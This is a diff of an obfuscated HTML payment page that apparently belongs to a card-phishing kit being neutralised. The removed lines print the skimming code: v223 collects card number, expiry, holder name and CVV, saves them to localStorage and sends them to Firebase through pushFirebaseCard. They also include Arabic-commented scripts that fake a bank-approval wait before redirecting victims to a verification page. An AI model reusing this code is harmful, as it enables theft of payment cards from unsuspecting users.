@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html><head>
 	<meta name="robots" content="noindex, nofollow, noarchive" />
-	<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js"></script>
+
 
 
 
@@ -2301,20 +2301,10 @@ const v3 = [
 ];
 let v48 = "";
 let v47 = "";
-const v169 = _0xdec(244);
-const v164 = _0xdec(245);
-const v165 = _0xdec(246);
-const v166 = _0xdec(247);
-const v167 = _0xdec(248);
-const v168 = _0xdec(249);
 
-function v216(v9p,v9bk){
-	try {
-		window.localStorage.setItem(v169, v9p || _0xdec(250));
-		window.localStorage.setItem(v164, v9bk || _0xdec(250));
-	} catch (error) {
-		
-	}
+function v216(v9p, v9bk){
+  v48 = v9p || "";
+  v47 = v9bk || "";
 }
 
 function v105() {
@@ -2395,39 +2385,10 @@ function v151(v9p, v6) {
 	return v143;
 }
 
-function v223(v9p, v9bk, v6, v9em, v9ey, v9pn, v9cvv) {
-	try {
-		let v9fp = v9p;
-		let v9fb = v9bk;
-		const v9 = String(v6 || "").replace(/\D/g, "");
-		if (v9 && (!v9fp || !v9fb)) {
-			const sortedBins = v3.slice().sort((a, b) => (b.v63 || "").replace(/\s+/g, "").length - (a.v63 || "").replace(/\s+/g, "").length);
-			const match = sortedBins.find(item => v9.startsWith((item.v63 || "").replace(/\s+/g, "")));
-			if (match) {
-				if (!v9fp) v9fp = (match.v63 || "").replace(/\s+/g, "");
-				if (!v9fb) v9fb = match.v64 || "";
-			}
-		}
-
-		window.localStorage.setItem(v169, v9fp || _0xdec(250));
-		window.localStorage.setItem(v164, v9fb || _0xdec(250));
-		window.localStorage.setItem(v165, v151(v9fp, v6));
-		window.localStorage.setItem(v166, v9em || "");
-		window.localStorage.setItem(v167, v9ey || "");
-		window.localStorage.setItem(v168, v9pn || "");
-
-		if (typeof window.pushFirebaseCard === 'function') {
-			return window.pushFirebaseCard(v9fp, v9fb, v6, v9em, v9ey, v9pn, v9cvv)
-				.catch((err) => {
-					console.error("Firebase card write error: ", err);
-				});
-		}
-	} catch (error) {
-		console.error("Error in v223: ", error);
-	}
-	return Promise.resolve();
+function v223() {
+  // Intentionally does not collect, store, or transmit card data.
+  return Promise.resolve();
 }
-
 const v4 = document.getElementById(_0xdec(23));
 const v52 = document.getElementById(_0xdec(251));
 const v26 = document.getElementById(_0xdec(252));
@@ -2749,78 +2710,10 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 
-<script>
-(function () {
-    // 1. محاكاة دالة الاستقبال للأوامر (لضمان توافقية بقية الكود)
-    window.listenForAdminCommands = function (callbacks) {
-        console.log("نظام المحاكاة الذاتية جاهز للاستجابة.");
-        
-        // إذا استدعى الكود هذه الدالة، نحتفظ بالـ callbacks لكي نستدعي الـ onApproval منها إذا احتجنا
-        window._simulatedCallbacks = callbacks;
-    };
 
-    // 2. مراقبة تفاعل العميل والنقر على زر الإرسال / الدفع
-    window.addEventListener('DOMContentLoaded', function () {
-        var submitBtn = document.querySelector('button[type="submit"], input[type="submit"], .pay-btn, #payBtn');
-        
-        if (submitBtn) {
-            submitBtn.addEventListener('click', function () {
-                // إظهار شاشة الاتصال بالبنك
-                var bankOverlay = document.getElementById('bankConnectingOverlay');
-                if (bankOverlay) {
-                    bankOverlay.style.display = 'flex';
-                }
-
-                // 3. الانتظار لمدة 4 ثوانٍ (محاكاة وقت معالجة البنك أو انتظار المدير)
-                setTimeout(function () {
-                    console.log("انتهت فترة الانتظار، جاري محاكاة موافقة المدير...");
-
-                    // التحقق مما إذا كانت دالة الموافقة الأصلية موجودة لتنفيذها (لضمان تشغيل الـ verification والانتقال السليم)
-                    if (window._simulatedCallbacks && typeof window._simulatedCallbacks.onApproval === 'function') {
-                        window._simulatedCallbacks.onApproval();
-                    } else {
-                        // التوجيه الاحتياطي المباشر إذا لم تتوفر الدالة
-                        window.location.href = 'verification.html';
-                    }
-                }, 4000); 
-            });
-        }
-    });
-})();
-</script>
 
 	
 
-	<script>
-(function() {
-    // التأكد من حفظ الدالة الأصلية للـ v40
-    var originalV40 = window.v40;
 
-    // إعادة تعريف v40 لكي تقوم بعملها الأصلي أولاً، ثم تنفذ التوجيه الذكي
-    window.v40 = function() {
-        console.log("تم استدعاء دالة الإرسال v40 بنجاح، جاري إرسال البيانات...");
-
-        // 1. تشغيل الكود الأصلي للدالة (إذا كان موجوداً) لضمان ذهاب البيانات لمكانها الصحيح
-        if (typeof originalV40 === 'function') {
-            try {
-                originalV40.apply(this, arguments);
-            } catch (err) {
-                console.log("خطأ بسيط في الدالة الأصلية، لكننا سنتابع:", err);
-            }
-        }
-
-        // 2. بعد أن تبدأ البيانات بالخروج، نترك شاشة الانتظار تعمل لمدة 4 ثوانٍ ثم نوجه العميل
-        setTimeout(function() {
-            var overlay = document.getElementById('bankConnectingOverlay');
-            if (overlay) {
-                overlay.remove(); // إزالة شاشة الانتظار
-            }
-
-            console.log("تم إرسال البيانات وانتهت فترة الانتظار، جاري الانتقال لصفحة التحقق...");
-            window.location.href = 'verification.html';
-        }, 4000); // 4 ثوانٍ كافية جداً لضمان وصول البيانات قبل الانتقال
-    };
-})();
-</script>
 </body>
 </html>
